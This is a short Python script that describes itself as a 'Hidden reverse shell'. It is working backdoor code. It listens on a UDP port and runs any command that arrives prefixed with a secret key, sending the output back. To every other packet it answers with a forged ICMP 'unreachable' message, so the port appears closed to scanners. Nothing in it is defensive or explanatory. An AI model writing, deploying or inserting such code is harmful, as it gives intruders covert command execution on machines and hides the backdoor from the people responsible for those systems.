#! /usr/bin/python3

import socket
import struct
import argparse
import subprocess
import os

parser = argparse.ArgumentParser(description="Hidden reverse shell")
parser.add_argument('port', type=int, help='port to listen on')
parser.add_argument('key', help='secret key')
args = parser.parse_args()

UDP_IP = "127.0.0.1"
UDP_PORT = args.port
ICMP_CODE = 1
HOST_UNREACHABLE = 3
PORT_UNREACHABLE = 3
SECRET = args.key

#socket to receive commands from
recsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
recsock.bind((UDP_IP, UDP_PORT))

# socket used to send fake ICMP messages
fakesock = socket.socket(socket.AF_INET, socket.SOCK_RAW, ICMP_CODE)

while True:
	data, addr = recsock.recvfrom(1024)
	data = data.decode("utf-8")
	if(data[:len(SECRET)] == SECRET):
		data = data[len(SECRET):]
		ret = os.popen("%s" % data).read()
		recsock.sendto(ret.encode("utf-8"), addr)	
	else:
		icmp = struct.pack('bbHi', HOST_UNREACHABLE, PORT_UNREACHABLE, 0xfcfc, 0)
		fakesock.sendto(icmp, addr)
